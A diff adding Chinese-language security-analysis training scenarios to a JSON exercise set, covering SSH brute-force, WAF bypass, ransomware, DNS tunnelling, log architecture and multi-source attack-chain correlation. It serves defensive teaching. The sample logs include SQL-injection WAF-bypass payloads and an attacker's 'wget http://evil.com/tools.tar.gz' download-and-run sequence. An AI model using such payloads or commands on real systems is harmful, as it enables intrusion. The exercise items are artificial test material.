@@ -254,5 +254,270 @@
         "hint": "按优先级排序：先解决日志留存和防篡改，再完善审计和告警机制"
       }
     ]
+  },
+  {
+    "scenario_id": "S007",
+    "name": "SSH暴力破解检测与防御",
+    "category": "intrusion_detection",
+    "difficulty": "初级",
+    "order": 7,
+    "description": "学习识别SSH暴力破解攻击，掌握日志分析、攻击溯源、防御加固的完整流程",
+    "objectives": [
+      "能从SSH日志中提取暴力破解攻击特征",
+      "能计算攻击频率并判断攻击等级",
+      "能编写防御策略（fail2ban、密钥认证、端口修改）"
+    ],
+    "tasks": [
+      {
+        "task_id": "T007-1",
+        "order": 1,
+        "title": "暴力破解特征提取",
+        "description": "分析以下5分钟内的SSH日志，提取攻击者IP、尝试次数、使用的用户名列表",
+        "input_type": "log_lines",
+        "input_data": [
+          "Mar 16 08:00:01 server sshd[1001]: Failed password for root from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:03 server sshd[1002]: Failed password for admin from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:05 server sshd[1003]: Failed password for root from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:07 server sshd[1004]: Failed password for test from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:09 server sshd[1005]: Failed password for admin from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:11 server sshd[1006]: Failed password for root from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:15 server sshd[1007]: Failed password for user1 from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:18 server sshd[1008]: Failed password for root from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:20 server sshd[1009]: Failed password for oracle from 10.0.0.5 port 22 ssh2",
+          "Mar 16 08:00:22 server sshd[1010]: Failed password for root from 10.0.0.5 port 22 ssh2"
+        ],
+        "expected_output": {"type": "fields", "fields": ["attacker_ip", "attempt_count", "usernames", "frequency"]},
+        "submit_type": "conclusion",
+        "hint": "统计同一源IP的出现次数，去重用户名，计算每分钟尝试次数"
+      },
+      {
+        "task_id": "T007-2",
+        "order": 2,
+        "title": "防御策略配置",
+        "description": "基于上述攻击特征，请编写fail2ban配置，封禁10.0.0.5的SSH访问30分钟",
+        "input_type": "text",
+        "input_data": "需求：在/etc/fail2ban/jail.local中配置SSH防护规则，10分钟内5次失败即封禁30分钟",
+        "expected_output": {"type": "script", "fields": ["config_content"]},
+        "submit_type": "script",
+        "hint": "配置 [sshd] 段，设置 maxretry=5, findtime=600, bantime=1800"
+      },
+      {
+        "task_id": "T007-3",
+        "order": 3,
+        "title": "攻击溯源报告",
+        "description": "基于前面的分析，请编写一份完整的攻击溯源报告，包含：攻击时间线、受影响资产、损失评估、加固建议",
+        "input_type": "text",
+        "input_data": "攻击时间：08:00-08:01；源IP：10.0.0.5（外网IP）；目标：SSH服务器；结果：未成功",
+        "expected_output": {"type": "plan", "fields": ["timeline", "affected_assets", "impact", "remediation"]},
+        "submit_type": "plan",
+        "hint": "结构化的溯源报告应包括：事件概述、时间线、技术分析、影响评估、处置建议"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S008",
+    "name": "WAF绕过与检测",
+    "category": "web_attack",
+    "difficulty": "高级",
+    "order": 8,
+    "description": "学习SQL注入、XSS等Web攻击的WAF绕过技术，以及如何从WAF日志中识别绕过行为",
+    "objectives": [
+      "能识别常见的WAF绕过技术（编码绕过、分块传输、参数污染）",
+      "能从WAF日志中识别绕过行为",
+      "能编写WAF规则封禁绕过尝试"
+    ],
+    "tasks": [
+      {
+        "task_id": "T008-1",
+        "order": 1,
+        "title": "WAF绕过识别",
+        "description": "分析以下WAF告警日志，判断攻击者使用了哪种绕过技术",
+        "input_type": "log_lines",
+        "input_data": [
+          "WAF BLOCK: 10.0.0.5 GET /product?id=1%20UNION%20SELECT%201,2,3,4",
+          "WAF BLOCK: 10.0.0.5 GET /product?id=1/**/UNION/**/SELECT/**/1,2,3,4",
+          "WAF BLOCK: 10.0.0.5 GET /product?id=1 UNION ALL SELECT 1,2,3,4",
+          "WAF BLOCK: 10.0.0.5 GET /product?id=1%0aUNION%0aSELECT%0a1,2,3,4"
+        ],
+        "expected_output": {"type": "conclusion", "fields": ["attack_type", "bypass_techniques", "detection_tips"]},
+        "submit_type": "conclusion",
+        "hint": "观察攻击者如何改变SQL关键词的写法：注释、编码、换行、大小写"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S009",
+    "name": "勒索软件事件响应",
+    "category": "incident_response",
+    "difficulty": "中级",
+    "order": 9,
+    "description": "模拟勒索软件攻击事件，从日志中识别勒索软件感染过程，制定应急响应方案",
+    "objectives": [
+      "能从日志中识别勒索软件感染特征",
+      "能制定应急响应流程",
+      "能编写数据恢复方案"
+    ],
+    "tasks": [
+      {
+        "task_id": "T009-1",
+        "order": 1,
+        "title": "感染日志识别",
+        "description": "分析以下日志，判断哪些是勒索软件感染的典型特征",
+        "input_type": "log_lines",
+        "input_data": [
+          "10:00:00 用户user1收到来自 external@evil.com 的带附件的邮件",
+          "10:01:00 user1 打开附件 document.docm（宏启用）",
+          "10:02:00 进程 powershell.exe 执行，外联 45.33.32.156:443",
+          "10:05:00 大量文件被修改：*.docx, *.xlsx, *.pdf, *.jpg",
+          "10:06:00 文件末尾追加 .encrypted 扩展名",
+          "10:07:00 桌面创建 README_TO_DECRYPT.txt"
+        ],
+        "expected_output": {"type": "conclusion", "fields": ["infection_vector", "indicators", "timestamp", "severity"]},
+        "submit_type": "conclusion",
+        "hint": "关注文件操作行为的异常：大量文件被修改、扩展名变更、勒索信创建"
+      },
+      {
+        "task_id": "T009-2",
+        "order": 2,
+        "title": "应急响应方案",
+        "description": "基于上述感染事件，请制定应急响应方案，包括：断网隔离、取证、恢复、复盘",
+        "input_type": "text",
+        "input_data": "感染范围：1台Windows服务器，200+文件被加密；无备份；无EDR",
+        "expected_output": {"type": "plan", "fields": ["immediate_actions", "forensics_steps", "recovery_plan", "prevention"]},
+        "submit_type": "plan",
+        "hint": "应急响应标准流程：检测分析→遏制根除→恢复→复盘改进"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S010",
+    "name": "DNS隧道检测",
+    "category": "network_security",
+    "difficulty": "高级",
+    "order": 10,
+    "description": "学习DNS隧道攻击原理，从DNS日志中识别隧道通信，编写检测规则",
+    "objectives": [
+      "理解DNS隧道攻击原理",
+      "能从DNS日志中识别隧道特征",
+      "能编写DNS隧道检测规则"
+    ],
+    "tasks": [
+      {
+        "task_id": "T010-1",
+        "order": 1,
+        "title": "DNS隧道特征识别",
+        "description": "分析以下DNS查询日志，判断哪些是异常DNS查询并说明理由",
+        "input_type": "log_lines",
+        "input_data": [
+          "10:00:00 10.0.0.1 查询 www.google.com A",
+          "10:00:01 10.0.0.50 查询 a2738d9f1c2b3e4f.tunnel.evil.com TXT",
+          "10:00:02 10.0.0.1 查询 mail.company.com A",
+          "10:00:03 10.0.0.50 查询 5f8a2d1c9e3b7f0a.tunnel.evil.com TXT",
+          "10:00:05 10.0.0.50 查询 1c3d5e7f9a2b4c6d.tunnel.evil.com TXT",
+          "10:00:10 10.0.0.50 查询 9e2a4b6c8d0f1e3a.tunnel.evil.com A"
+        ],
+        "expected_output": {"type": "conclusion", "fields": ["suspicious_ips", "evidence", "tunnel_type", "confidence"]},
+        "submit_type": "conclusion",
+        "hint": "关注域名长度、子域名随机性、TXT记录查询频率、非常规域名"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S011",
+    "name": "日志存储架构设计",
+    "category": "architecture",
+    "difficulty": "中级",
+    "order": 11,
+    "description": "根据企业规模设计日志存储架构，包含采集、传输、存储、检索全链路",
+    "objectives": [
+      "能根据企业规模选择合适的日志架构",
+      "能设计Elasticsearch集群方案",
+      "能制定日志留存和容量规划"
+    ],
+    "tasks": [
+      {
+        "task_id": "T011-1",
+        "order": 1,
+        "title": "架构方案设计",
+        "description": "某大型企业：500台服务器、200台网络设备、日均日志量5TB、日志留存180天、检索响应<5秒。请设计日志架构",
+        "input_type": "text",
+        "input_data": "规模：大型；设备：500台服务器+200台网络设备；日志量：5TB/天；留存：180天；检索：<5秒",
+        "expected_output": {"type": "plan", "fields": ["architecture", "components", "storage_calc", "high_availability"]},
+        "submit_type": "plan",
+        "hint": "考虑Kafka做缓冲、ES集群做存储（分片规划）、冷热分层降成本"
+      },
+      {
+        "task_id": "T011-2",
+        "order": 2,
+        "title": "容量规划计算",
+        "description": "计算上述架构的存储需求：总存储量、ES节点数、内存需求、磁盘类型建议",
+        "input_type": "text",
+        "input_data": "日均日志量5TB，留存180天，压缩比1:1.5，副本数1，ES节点内存64GB/节点",
+        "expected_output": {"type": "conclusion", "fields": ["total_storage", "node_count", "memory_total", "disk_type"]},
+        "submit_type": "conclusion",
+        "hint": "总存储 = 日均量 × 留存天数 / 压缩比 × (1 + 副本数)"
+      }
+    ]
+  },
+  {
+    "scenario_id": "S012",
+    "name": "多源日志综合研判",
+    "category": "comprehensive",
+    "difficulty": "高级",
+    "order": 12,
+    "description": "综合运用防火墙、WAF、服务器、AD域控等多源日志，还原完整攻击链并进行综合研判",
+    "objectives": [
+      "能关联多源日志还原完整攻击链",
+      "能综合评估事件影响范围和危害等级",
+      "能输出完整的应急处置报告"
+    ],
+    "tasks": [
+      {
+        "task_id": "T012-1",
+        "order": 1,
+        "title": "多源日志关联分析",
+        "description": "将以下多源日志按时间线关联，还原攻击者的完整攻击路径",
+        "input_type": "log_lines",
+        "input_data": [
+          "[防火墙] 08:00:00 10.0.0.5:54321 → 10.0.0.1:22 TCP 允许",
+          "[防火墙] 08:00:05 10.0.0.5:54321 → 10.0.0.1:22 TCP 允许",
+          "[防火墙] 08:00:10 10.0.0.5:54321 → 10.0.0.1:22 TCP 允许",
+          "[SSH服务器] 08:00:03 Failed password for root from 10.0.0.5",
+          "[SSH服务器] 08:00:08 Failed password for admin from 10.0.0.5",
+          "[SSH服务器] 08:00:12 Accepted password for admin from 10.0.0.5",
+          "[SSH服务器] 08:05:00 admin executed: wget http://evil.com/tools.tar.gz",
+          "[SSH服务器] 08:06:00 admin executed: chmod +x tools.tar.gz && ./tools/scan.sh",
+          "[防火墙] 08:10:00 10.0.0.1:40000 → 10.0.0.50:445 TCP 允许",
+          "[AD域控] 08:11:00 用户admin从10.0.0.1登录到10.0.0.50",
+          "[服务器] 08:15:00 10.0.0.50 executed: whoami && net localgroup administrators",
+          "[服务器] 08:20:00 10.0.0.50 外联 203.0.113.5:443"
+        ],
+        "expected_output": {"type": "conclusion", "fields": ["attack_chain", "attack_stages", "compromised_assets", "c2"]},
+        "submit_type": "conclusion",
+        "hint": "按时间线排列事件，标注每个阶段对应ATT&CK的哪个技术"
+      },
+      {
+        "task_id": "T012-2",
+        "order": 2,
+        "title": "影响范围评估",
+        "description": "基于上述关联分析，评估本次安全事件的影响范围、危害等级和业务影响",
+        "input_type": "text",
+        "input_data": "资产：3台服务器（10.0.0.1 SSH服务器、10.0.0.50 应用服务器、AD域控）；业务：核心业务系统",
+        "expected_output": {"type": "conclusion", "fields": ["impact_scope", "risk_level", "business_impact", "data_breach"]},
+        "submit_type": "conclusion",
+        "hint": "评估标准：机密性（哪些数据可能泄露）、完整性（哪些系统被篡改）、可用性（哪些业务受影响）"
+      },
+      {
+        "task_id": "T012-3",
+        "order": 3,
+        "title": "处置报告编写",
+        "description": "请编写完整的应急处置报告，包含：事件概述、时间线、技术分析、处置措施、改进建议",
+        "input_type": "text",
+        "input_data": "事件从08:00发现到当前时间，已完成：①封禁10.0.0.5 ②隔离10.0.0.1/50 ③提取取证数据",
+        "expected_output": {"type": "plan", "fields": ["summary", "timeline", "analysis", "actions", "recommendations"]},
+        "submit_type": "plan",
+        "hint": "报告应结构化：事件编号、发现时间、响应时间、处置步骤、根因分析、改进计划"
+      }
+    ]
   }
 ]
